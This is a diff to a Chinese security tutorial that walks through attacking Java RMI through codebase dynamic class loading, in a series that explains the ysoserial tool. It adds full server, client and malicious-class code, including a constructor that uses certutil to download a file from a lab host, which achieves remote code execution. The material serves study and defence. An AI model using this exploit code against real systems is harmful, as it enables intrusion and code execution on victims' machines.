@@ -278,8 +278,8 @@ BadAttributeValueExpException val = new BadAttributeValueExpException(entry);
 
 利用JVM动态加载类制发起攻击，该机制的原理类似Unix-like系统的源机制，如果JVM要调用某个类但在当前classpath中找不到其定义，则会按照`java.rmi.server.codebase`属性（其他默认限制条件都打开）定义的远程地址寻找类的class文件。codebase支持`http://`、`ftp://`、`file://`等协议，举几个会触发远程加载的情形：
 
-* 对于客户端，如果调用的服务端方法的返回值是某个已知类的子类，但客户端本身没有该子类的class文件，客户端就**会按服务端提供的codebaseURL去加载类**。
-* 对于服务端，如果客户端传递给方法的参数是原参数类型的子类，但服务端没有该子类的class文件，服务端就**会按客户端提供的codebaseURL去加载类**。
+* 对于客户端，如果*调用的服务端方法的返回值是某个已知类的子类*，但客户端本身没有该子类的class文件，客户端就**会按服务端提供的codebaseURL去加载类**。
+* 对于服务端，如果*客户端传递给方法的参数是原参数类型的子类*，但服务端没有该子类的class文件，服务端就**会按客户端提供的codebaseURL去加载类**。
 
 开启RMI的codebase特性需要满足以下条件：
 
@@ -306,11 +306,130 @@ BadAttributeValueExpException val = new BadAttributeValueExpException(entry);
 
 2. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。从JDK 6u45、7u21开始，其默认值就是true。
 
-示例代码如下：
+   > ```java
+   > System.setProperty("java.rmi.server.useCodebaseOnly","false");
+   > ```
+
+3. 以上特性也可以通过修改jvm启动参数实现：
+
+   > ```java
+   > java -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy="policy.permission" xxx
+   > ```
+
+测试代码如下，首先是客户端、服务端都知道的公共接口：
+
+```java
+import java.rmi.RemoteException;
+
+public interface Services extends java.rmi.Remote {
+    Object sendMessage(String msg) throws RemoteException;
+}
+// Services接口的sendMessage()方法
+// 其返回值为Object类、参数为String类
+```
+
+接着是服务端代码：
+
+```java
+/**
+*	ServicesImpl1.java
+**/
+public class ServicesImpl1 implements Services, Serializable {
+    @Override
+    //这里在服务端将返回值为Object的子类——ExportObject类
+    //客户端并不知道该类的定义内容
+    public Object sendMessage(String msg) throws RemoteException {
+        Object tt= "FDF";
+        try {
+            tt= new EvilObject();
+        }catch (Exception e){
+
+        }
+        return tt;
+    }
+}
+
+/**
+*	EvilObject.java
+**/
+// 恶意类的定义，除了构造函数还有static{}段内可写payload，当然也可以写入别的方法，但需要接口类中有调用
+import java.io.Serializable;
+
+public class EvilObject implements Serializable{
+    public EvilObject()  throws Exception{
+        Runtime.getRuntime().exec("certutil.exe -urlcache -split -f \"http://10.10.10.136:8000/123.txt\" d:\\path_to_desktop\\bad.txt");
+    }
+}
 
 
+/**
+* testRMI.java
+* 主要的服务端代码
+**/
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.UnicastRemoteObject;
 
-### 攻击Registry
+public class testRMI {
+    public static void main(String[] args) {
+        try {
+            // 实例化服务端远程对象
+            ServicesImpl1 obj = new ServicesImpl1();
+            // 没有继承UnicastRemoteObject时需要使用静态方法exportObject处理
+            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);
+            //设置java.rmi.server.codebase
+            System.setProperty("java.rmi.server.codebase", "http://10.10.10.1:8000/");
+            System.setProperty("java.rmi.server.useCodebaseOnly","false");
+            Registry reg;
+            try {
+                // 创建Registry
+                reg = LocateRegistry.createRegistry(9999);
+                System.out.println("java RMI registry created. port on 9999...");
+            } catch (Exception e) {
+                System.out.println("Using existing registry");
+                reg = LocateRegistry.getRegistry();
+            }
+            //绑定远程对象到Registry
+            reg.bind("Services", services);
+        } catch (RemoteException e) {
+            e.printStackTrace();
+        } catch (AlreadyBoundException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+需要注意的是，恶意类应当也实现下Serializable接口，否则客户端调用会报错，而且也不会去请求codebase，但这不影响RCE。在异常产生之前，服务端代码执行的过程已经发生了。紧接着客户端代码：
+
+```java
+import java.lang.SecurityManager;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class testRMI {
+    public static void main(String[] args) throws Exception {
+        //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
+        System.setProperty("java.security.policy", testRMI.class.getClassLoader().getResource("java.policy").getFile());
+        System.setProperty("java.rmi.server.useCodebaseOnly","false");
+        SecurityManager securityManager = new SecurityManager();
+        System.setSecurityManager(securityManager);
+
+        Registry registry = LocateRegistry.getRegistry("10.10.10.1", 9999);
+        // 获取远程对象的引用
+        Services services = (Services) registry.lookup("Services");
+        services.sendMessage("everybody");
+    }
+}
+```
+
+这里的场景和之前描述的一致，10.10.10.136是一台linux主机，上面开启了http的8000端口，同时也是RMI客户端。10.10.10.1是一台win10主机，也是RMI服务端，它同时提供了codebase的URL地址。客户端在调用方法时因其不知返回值EvilObject类的定义，所以会按照codebase URL去找class文件。服务端依据客户端提供的参数在自己的JVM上实例化对象并执行方法调用，在实例化EvilObject对象时执行了payload。
+
+![](Ysoserial工具解读（六）\port8000.jpg)
+
+### 攻击server——方法3，攻击Registry
 
 其实，只要知道注册机的IP、端口，客户端也可以调用`bind()`函数绑定RMI对象，这也是存在这种攻击方式的原因。下面分析的攻击代码源自ysoserial工具的`exploit/RMIRegistryExploit`，主要代码如下：
 
@@ -429,9 +548,7 @@ value在反序列化时就引发了后面的调用过程（PriorityQueue -> Tran
 
 ### 攻击Client
 
-
-
-
+（目前这一部分内容代码暂未调通，等待后续补充. . .）
 
  ## YSOSERIAL中的RMI相关代码
 
